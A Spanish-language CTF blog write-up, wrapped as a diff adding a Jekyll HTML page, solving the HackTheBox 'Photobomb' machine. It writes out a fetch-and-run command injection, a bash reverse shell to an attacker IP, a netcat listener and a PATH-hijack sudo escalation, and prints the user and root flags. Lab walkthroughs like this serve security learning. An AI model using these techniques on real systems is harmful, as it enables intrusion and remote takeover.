@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Photobomb (easy) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Photobomb (easy)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-09-29T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Photobomb (easy)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-09-29T00:00:00-06:00","datePublished":"2024-09-29T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Photobomb (easy)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb.html"},"url":"http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Photobomb (easy)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-09-29T00:00:00-06:00" itemprop="datePublished">
+        Sep 29, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/52e97c6ca888644478ddcadfcd9f8be5.png" />
+</p>
+
+<ul>
+  <li>Photobomb is an easy Linux machine where plaintext credentials are used to access an internal web application with a <code class="language-plaintext highlighter-rouge">Download</code> functionality that is vulnerable to a blind command injection. Once a foothold as the machine main user is established, a poorly configured shell script that references binaries without their full paths is leveraged to obtain escalated privileges, as it can be ran with <code class="language-plaintext highlighter-rouge">sudo</code>.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn ../nmap/targeted
+<span class="c"># Nmap 7.94SVN scan initiated Sun Sep 29 12:39:55 2024 as: nmap -sCV -p22,80 -oN targeted 10.10.11.182</span>
+Nmap scan report <span class="k">for </span>10.10.11.182
+Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d <span class="o">(</span>RSA<span class="o">)</span>
+|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Did not follow redirect to http://photobomb.htb/
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun Sep 29 12:40:32 2024 -- 1 IP address (1 host up) scanned in 36.79 seconds</span>
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Agregamos el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.11.182 photobomb.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la pagina web.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/photobomb/1.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Nos dicen que demos <code class="language-plaintext highlighter-rouge">click</code> en la parte morada y que las credenciales las encontraremos en nuestro paquete de inicio.</p>
+  </li>
+  <li>
+    <p>Si damos <code class="language-plaintext highlighter-rouge">click</code> nos piden credenciales pero por el momento no tenemos ningunas.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/photobomb/2.png" />
+</p>
+
+<ul>
+  <li>Si revisamos el código fuente en el archivo <code class="language-plaintext highlighter-rouge">Javascript</code> encontramos lo que parecen ser credenciales.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/photobomb/3.png" />
+</p>
+
+<ul>
+  <li>Si las probamos nos deja conectarnos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/photobomb/4.png" />
+</p>
+
+<h2 id="shell-as-wizard">Shell as wizard</h2>
+
+<ul>
+  <li>Ahora lo que vamos a hacer es interceptar con <code class="language-plaintext highlighter-rouge">Burpsuite</code> la petición al momento de dar <code class="language-plaintext highlighter-rouge">click</code> en el botón rojo para ver como viaja la petición.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/photobomb/5.png" />
+</p>
+
+<ul>
+  <li>Después de probar varias inyecciones en la parte de <code class="language-plaintext highlighter-rouge">filetype</code> podemos concatenar un comando en esta ocasión me hago una petición a un script el cual por el momento no existe y me llega la petición.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/photobomb/6.png" />
+</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.11.182 - - <span class="o">[</span>29/Sep/2024 13:14:05] code 404, message File not found
+10.10.11.182 - - <span class="o">[</span>29/Sep/2024 13:14:05] <span class="s2">"GET /shell.sh HTTP/1.1"</span> 404 -
+</code></pre></div></div>
+
+<ul>
+  <li>Sabiendo que podemos inyectar comandos vamos a crear el archivo para obtener una reverse Shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>shell.sh
+───────┬──────────────────────────────────────────────────
+       │ File: shell.sh
+───────┼──────────────────────────────────────────────────
+   1   │ <span class="c">#!/bin/bash</span>
+   2   │ 
+   3   │ bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.30/443 0&gt;&amp;1
+───────┴──────────────────────────────────────────────────
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos ponemos en escucha.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Y simplemente enviamos la petición.</p>
+  </li>
+  <li>
+    <p>Agregamos <code class="language-plaintext highlighter-rouge">| bash</code> para que lo interprete.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/photobomb/7.png" />
+</p>
+
+<ul>
+  <li>Nos llega la Shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.30] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.182] 43738
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>697<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+wizard@photobomb:~/photobomb<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>wizard
+wizard@photobomb:~/photobomb<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora hacemos un tratamiento de la <code class="language-plaintext highlighter-rouge">tty</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:~/photobomb<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
+wizard@photobomb:~/photobomb<span class="nv">$ </span>^Z
+zsh: suspended  nc <span class="nt">-nlvp</span> 443
+❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
+<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 443
+                              reset xterm
+ENTER
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Podemos ver la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+c2dd57cf27062d9098da457334b87181
+wizard@photobomb:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>No vemos nada interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:/<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+/usr/bin/gpasswd
+/usr/bin/fusermount
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/at
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos correr ese script como <code class="language-plaintext highlighter-rouge">root</code> sin proporcionar contraseñas y <code class="language-plaintext highlighter-rouge">setear</code> variables de entorno.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>wizard on photobomb:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User wizard may run the following commands on photobomb:
+    <span class="o">(</span>root<span class="o">)</span> SETENV: NOPASSWD: /opt/cleanup.sh
+wizard@photobomb:/<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Con <code class="language-plaintext highlighter-rouge">find</code> esta buscando todos los archivos con extensión <code class="language-plaintext highlighter-rouge">".jpg"</code> en el directorio <code class="language-plaintext highlighter-rouge">"source_images"</code> y sus subdirectorios, y cambia el propietario y grupo de cada archivo encontrado a <code class="language-plaintext highlighter-rouge">"root:root"</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:/<span class="nv">$ </span><span class="nb">cat</span> /opt/cleanup.sh 
+<span class="c">#!/bin/bash</span>
+<span class="nb">.</span> /opt/.bashrc
+<span class="nb">cd</span> /home/wizard/photobomb
+
+<span class="c"># clean up log files</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nt">-s</span> log/photobomb.log <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="o">[</span> <span class="nt">-L</span> log/photobomb.log <span class="o">]</span>
+<span class="k">then</span>
+  /bin/cat log/photobomb.log <span class="o">&gt;</span> log/photobomb.log.old
+  /usr/bin/truncate <span class="nt">-s0</span> log/photobomb.log
+<span class="k">fi</span>
+
+<span class="c"># protect the priceless originals</span>
+find source_images <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s1">'*.jpg'</span> <span class="nt">-exec</span> <span class="nb">chown </span>root:root <span class="o">{}</span> <span class="se">\;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos la capacidad de modificar variables como el <code class="language-plaintext highlighter-rouge">'path'</code> para utilizar un comando <code class="language-plaintext highlighter-rouge">'find'</code> personalizado. Además, si ejecutamos el comando <code class="language-plaintext highlighter-rouge">'find'</code> con privilegios de administrador, el <code class="language-plaintext highlighter-rouge">'find'</code> se ejecutará con permisos de <code class="language-plaintext highlighter-rouge">root</code>.</li>
+</ul>
+
+<center><iframe width="560" height="315" src="https://www.youtube.com/embed/Z3o0Y2kMoeU?si=Ifo5r-wcDUlddTBk" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></center>
+
+<ul>
+  <li>Vamos a darnos una <code class="language-plaintext highlighter-rouge">bash</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:~<span class="nv">$ </span><span class="nb">echo </span>bash <span class="o">&gt;</span> find
+wizard@photobomb:~<span class="nv">$ </span><span class="nb">chmod</span> +x find
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora modificamos el <code class="language-plaintext highlighter-rouge">path</code> temporalmente para dar prioridad al directorio actual.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:~<span class="nv">$ </span><span class="nb">sudo </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PWD</span>:<span class="nv">$PATH</span> /opt/cleanup.sh
+root@photobomb:/home/wizard/photobomb# <span class="nb">whoami
+</span>root
+root@photobomb:/home/wizard/photobomb# 
+</code></pre></div></div>
+
+<h2 id="root-flag">root flag</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@photobomb:/home/wizard/photobomb# <span class="nb">cat</span> /root/root.txt
+b740fbec8fa61254b2467d424ac7aaaa
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/easy/2024/09/29/photobomb.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_miguelitoregn7" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
